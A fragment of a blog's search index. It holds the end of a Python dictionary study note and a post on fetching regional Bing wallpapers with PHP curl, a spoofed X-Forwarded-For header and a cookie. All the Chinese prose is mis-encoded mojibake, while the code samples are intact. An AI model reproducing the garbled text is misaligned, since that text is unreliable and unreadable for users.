æ–¹æ³•ä»¥é¿å…è®¿é—®ä¸å­˜åœ¨çš„keyæ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œä»¥Noneå–ä»£ä¹‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA.get(<span class="string">&#x27;A&#x27;</span>) <span class="comment">#This will be 1</span></span><br><span class="line">dictA.get(<span class="string">&#x27;C&#x27;</span>) <span class="comment">#This will be None</span></span><br></pre></td></tr></table></figure><h5 id="Î³-æ›´æ–°å­—å…¸"><a href="#Î³-æ›´æ–°å­—å…¸" class="headerlink" title="Î³. æ›´æ–°å­—å…¸"></a>Î³. æ›´æ–°å­—å…¸</h5><p> ä½¿ç”¨ <span style="font-family:Consolas">update</span> æ–¹æ³•ä½¿ç”¨ä¸€ä¸ªå­—å…¸æ›´æ–°å¦ä¸€ä¸ªå­—å…¸ï¼ˆæ›´æ–°å¹¶åˆå¹¶ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictB = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;C&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">dictA.update(dictB)</span><br><span class="line"><span class="comment">#dictA will be &#123;&#x27;A&#x27;:2,&#x27;B&#x27;:2,&#x27;C&#x27;:3&#125;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <span style="font-family:Consolas">setdefault</span> æ–¹æ³•æ¥åˆå¹¶ï¼ˆä¸æ›´æ–°ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA.setdefault(<span class="string">&#x27;A&#x27;</span>,<span class="number">2</span>) <span class="comment">#dictA will still be &#123;&#x27;A&#x27;:1,&#x27;B&#x27;:2&#125;</span></span><br><span class="line">dictA.setdefault(<span class="string">&#x27;C&#x27;</span>,<span class="number">3</span>) <span class="comment">#dictA will be &#123;&#x27;A&#x27;:1,&#x27;B&#x27;:2,&#x27;C&#x27;:3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="Î¸-å…ƒç´ å­˜åœ¨æ€§åˆ¤æ–­"><a href="#Î¸-å…ƒç´ å­˜åœ¨æ€§åˆ¤æ–­" class="headerlink" title="Î¸. å…ƒç´ å­˜åœ¨æ€§åˆ¤æ–­"></a>Î¸. å…ƒç´ å­˜åœ¨æ€§åˆ¤æ–­</h5><p>ä½¿ç”¨ <span style="font-family:Consolas">in/not in</span> æ¥å¯¹keyè¿›è¡ŒæŸ¥è¯¢ï¼Œæ ¹æ®è¿”å›çš„ç»“æœè¿›è¡Œåˆ¤æ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span> <span class="keyword">in</span> dictA) <span class="comment">#This will be True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> dictA) <span class="comment">#This will be False</span></span><br></pre></td></tr></table></figure><h5 id="Î´-å­—å…¸æ ¼å¼åŒ–è¾“å‡º"><a href="#Î´-å­—å…¸æ ¼å¼åŒ–è¾“å‡º" class="headerlink" title="Î´. å­—å…¸æ ¼å¼åŒ–è¾“å‡º"></a>Î´. å­—å…¸æ ¼å¼åŒ–è¾“å‡º</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">template = <span class="string">&#x27;%(A)d,is not %(B)d&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(template % dictA) <span class="comment">#This will be 1 is not 2</span></span><br></pre></td></tr></table></figure><h4 id="4-2-Î±-Attentions"><a href="#4-2-Î±-Attentions" class="headerlink" title="[4.2.Î±] !Attentions"></a>[4.2.Î±] !Attentions</h4><p>ä»¥ä¸‹å€¼ç­‰åŒäºFalse</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span> <span class="number">0</span> () <span class="string">&quot;&quot;</span> [] &#123;&#125;</span><br></pre></td></tr></table></figure><p>ç©ºè¯­å¥ä½¿ç”¨passå®ç°</p><p>å½“æ–­è¨€ä¸ºFalseæ—¶ä¼šå¼•å‘é”™è¯¯</p><p>for-in å¾ªç¯ä¸­çš„å˜é‡ä¸åº”è¯¥åœ¨å¾ªç¯å†…æ›´æ”¹å€¼(foreach?)</p>]]></content>
      
      
      <categories>
          
          <category> StudyNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŠ“å–å„åœ°åŒºBingæœç´¢é¦–é¡µçš„èƒŒæ™¯å›¾</title>
      <link href="/zh-CN/posts/87aca34b.html"/>
      <url>/zh-CN/posts/87aca34b.html</url>
      
        <content type="html"><![CDATA[<h4 id="Bingçš„é™å®š"><a href="#Bingçš„é™å®š" class="headerlink" title="Bingçš„é™å®š"></a>Bingçš„é™å®š</h4><p>ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å§‹ï¼Œå•å•ä¾é åŸæ¥çš„ä¿®æ”¹ GET è¯·æ±‚çš„å‚æ•° cc æ¥è·å–Bingæœç´¢æ¯æ—¥åœ¨ä¸åŒåœ°åŒºå±•ç¤ºçš„èƒŒæ™¯å›¾ç‰‡è¡Œä¸é€šäº†ã€‚ <span class="heimu" title="ä½ å‘ç°äº†ï¼ï¼:)">å¯èƒ½æ˜¯èªæ˜çš„Bingè¯†ç ´äº†å¤§å®¶æŠ“å®ƒå£çº¸çš„å¥—è·¯</span> äºæ˜¯æˆ‘ç»†ç»†åœ°ç ”ç©¶äº†ä¸€ä¸‹å®ƒçš„æ–°å¥—è·¯ã€‚</p><p><escape><span id="more"></span></escape></p><h4 id="æ„é€ Header"><a href="#æ„é€ Header" class="headerlink" title="æ„é€ Header"></a>æ„é€ Header</h4><p>åœ¨åŸæ¥çš„ Header ä¸­åŠ å…¥äº†è¿™æ ·ä¸€è¡Œ <span style="color:blue">X-Forwarded-For:64.233.161.2</span> <span class="heimu" title="ä½ å‘ç°äº†ï¼ï¼:)">ä»¥æ··æ·†è§†å¬ï¼ˆä¸æ˜¯ï¼‰</span> ä¹‹åï¼Œå¾—åˆ°äº†è¿™æ ·ä¸€ä¸ªè¿”å›ç»“æœ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;images&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;startdate&quot;</span>: <span class="string">&quot;20191215&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;fullstartdate&quot;</span>: <span class="string">&quot;201912150800&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;enddate&quot;</span>: <span class="string">&quot;20191216&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/th?id=OHR.NutsWeekend_EN-US5701415684_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;urlbase&quot;</span>: <span class="string">&quot;/th?id=OHR.NutsWeekend_EN-US5701415684&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyright&quot;</span>: <span class="string">&quot;Beech forest covered with frost and snow, Ardennes, Belgium (Â© Philippe Moes/Alamy)&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyrightlink&quot;</span>: <span class="string">&quot;https://www.bing.com/search?q=battle+of+the+bulge&amp;form=hpcapt&amp;filters=HpDate%3a%2220191215_0800%22&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;The Battle of the Bulge 75 years later&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;quiz&quot;</span>: <span class="string">&quot;/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20191215_NutsWeekend%22&amp;FORM=HPQUIZ&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;wp&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;hsh&quot;</span>: <span class="string">&quot;a17e8b7d1284b2d4edb74483be0d8f43&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;drk&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;top&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;bot&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;hs&quot;</span>: [</span><br><span class="line">                </span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><h4 id="ä¿®æ­£è¯·æ±‚é“¾æ¥"><a href="#ä¿®æ­£è¯·æ±‚é“¾æ¥" class="headerlink" title="ä¿®æ­£è¯·æ±‚é“¾æ¥"></a>ä¿®æ­£è¯·æ±‚é“¾æ¥</h4><p>æ³¨æ„åˆ°è¿”å›çš„ UrlBase ä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ ‡è®°  <span style="color:blue">EN-US</span> ï¼Œäºæ˜¯æˆ‘åœ¨åŸæœ¬çš„è¯·æ±‚é“¾æ¥åå¸¦ä¸Šäº†åŸæ¥çš„ <span style="font-family:Consolas">cc</span> å‚æ•°</p><p>å¾—åˆ°äº†è¿™æ ·çš„è¿”å›ç»“æœ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;images&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;startdate&quot;</span>: <span class="string">&quot;20191214&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;fullstartdate&quot;</span>: <span class="string">&quot;201912141500&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;enddate&quot;</span>: <span class="string">&quot;20191215&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/th?id=OHR.TrilliumLake_JA-JP3615984347_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;urlbase&quot;</span>: <span class="string">&quot;/th?id=OHR.TrilliumLake_JA-JP3615984347&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyright&quot;</span>: <span class="string">&quot;ï½¢ãƒˆãƒªãƒªã‚¢ãƒ æ¹–ã¨ãƒ•ãƒƒãƒ‰å±±ã€ç±³å›½ã‚ªãƒ¬ã‚´ãƒ³å·, ãƒã‚¦ãƒ³ãƒˆãƒ•ãƒƒãƒ‰å›½ç«‹æ£®æ— (Â© Frank Krahmer/Getty Images)&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;copyrightlink&quot;</span>: <span class="string">&quot;https://www.bing.com/search?q=%E3%83%95%E3%83%83%E3%83%89%E5%B1%B1&amp;form=hpcapt&amp;filters=HpDate%3a%2220191214_1500%22&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;ã‚ªãƒ¬ã‚´ãƒ³å·ã®é™ã‹ãªæ¹–&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;quiz&quot;</span>: <span class="string">&quot;/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20191214_TrilliumLake%22&amp;FORM=HPQUIZ&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;wp&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;hsh&quot;</span>: <span class="string">&quot;6d2a3791c51a549d64928ee8d2dc7346&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;drk&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;top&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;bot&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;hs&quot;</span>: [</span><br><span class="line">                </span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œå¾—åˆ°çš„ç»“æœè¾¾åˆ°äº†é¢„æœŸ</p><h4 id="Cookiesçš„é™„åŠ "><a href="#Cookiesçš„é™„åŠ " class="headerlink" title="Cookiesçš„é™„åŠ "></a><del>Cookiesçš„é™„åŠ </del></h4><p>å…¶å®ä¸€å¼€å§‹è¯·æ±‚çš„æ—¶å€™æ˜¯æ— æ³•å¾—åˆ° title çš„ï¼Œåæ¥çœ‹äº†çœ‹ï¼Œæ˜¯å› ä¸ºå°‘äº†è¿™æ ·ä¸€è¡Œ Cookies: <span style="color:blue">ENSEARCH=<span style="color:brown">BENVER=1</span></span>ï¼ŒæŠŠå®ƒåŠ ä¸Šä¹‹åå°±å¾—åˆ°äº†å¸¦æœ‰ title çš„ç»“æœã€‚</p><h4 id="æ¥å£å®ç°"><a href="#æ¥å£å®ç°" class="headerlink" title="æ¥å£å®ç°"></a>æ¥å£å®ç°</h4><p>é¦–å…ˆæ ¹æ®æ€è·¯æ‰¾å‡ºä¸¤ç§ä¸ä¸€æ ·çš„è¯·æ±‚æ„é€ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt(<span class="variable">$objCurl</span>,CURLOPT_URL,<span class="string">&quot;http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=&quot;</span>.<span class="variable">$idx</span>.<span class="string">&quot;&amp;n=1&amp;ensearch=0&quot;</span>);</span><br><span class="line">curl_setopt(<span class="variable">$objCurl</span>,CURLOPT_URL,<span class="string">&quot;http://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=&quot;</span>.<span class="variable">$idx</span>.<span class="string">&quot;&amp;n=1&amp;cc=&quot;</span>.<span class="variable">$region</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ Headerï¼Œè®¾å®šç›¸åº”çš„ <code>X-Forwarded-For</code> å€¼ï¼Œç„¶åè®¾å®š Cookie ä¸º <code>ENSEARCH=BENVER=1</code>ã€‚</p><p>åŒæ—¶ï¼Œä¸ºäº†æ»¡è¶³å„ç§è¯·æ±‚éœ€è¦ï¼Œæˆ‘ç»™å‡ºäº†å››ä¸ªè¯·æ±‚å‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$idx</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;idx&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;idx&quot;</span>]):<span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$region</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;region&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;region&quot;</span>]):<span class="string">&quot;cn&quot;</span>;</span><br><span class="line"><span class="variable">$resolution</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;resolution&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;resolution&quot;</span>]):<span class="string">&quot;1920x1080&quot;</span>;</span><br><span class="line"><span class="variable">$swiftSwap</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ss&quot;</span>])?htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;ss&quot;</span>]):<span class="string">&quot;0&quot;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°åç§°</th><th align="left">å¿…å¡«</th><th align="left">ç±»å‹</th><th align="left">è¯´æ˜</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td align="left">idx</td><td align="left">å¦</td><td align="left">int</td><td align="left">å›¾ç‰‡å±•ç¤ºè·ä»Šå¤©æ•°</td><td>0</td></tr><tr><td align="left">region</td><td align="left">å¦</td><td align="left">string</td><td align="left">è·å–å›¾ç‰‡æ‰€å±•ç¤ºåœ°åŒº</td><td>cn</td></tr><tr><td align="left">resolution</td><td align="left">å¦</td><td align="left">string</td><td align="left">è·å–å›¾ç‰‡çš„åˆ†è¾¨ç‡</td><td>1920x1080</td></tr><tr><td align="left">ss</td><td align="left">å¦</td><td align="left">int</td><td align="left">å¿«é€Ÿè·³è½¬ å‚ç…§æ–‡ç« ä¸­çš„ä»£ç </td><td>0</td></tr></tbody></table><p>å…¶ä¸­çš„ <code>ss</code> ä¸º 0 æ—¶ï¼Œæ¥å£ä¼šè¿”å›è¯¦ç»†ä¿¡æ¯ï¼›ä¸º 1 æ—¶ï¼Œæ¥å£å°†åªè¿”å›å›¾ç‰‡çš„é“¾æ¥ï¼›ä¸º 3 æ—¶ï¼Œæ¥å£å°†ç›´æ¥è·³è½¬åˆ°ç›¸åº”å›¾ç‰‡çš„é¡µé¢ã€‚</p><p>æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å‘èµ·è¯·æ±‚å¹¶æ•´ç†è¿”å›å€¼ï¼Œå¹¶ä¸”åŠ å…¥ä¸€ç‚¹ç‚¹ç»†èŠ‚ã€‚</p><hr><a class="button is-light is-small" href="https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@0d71d4e1459695e52740f765018d3f2a7cfcaa07/source/phpAPI_BingWallpaperFetch_0.3.0.1.php"><span>Download Source</span></a>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
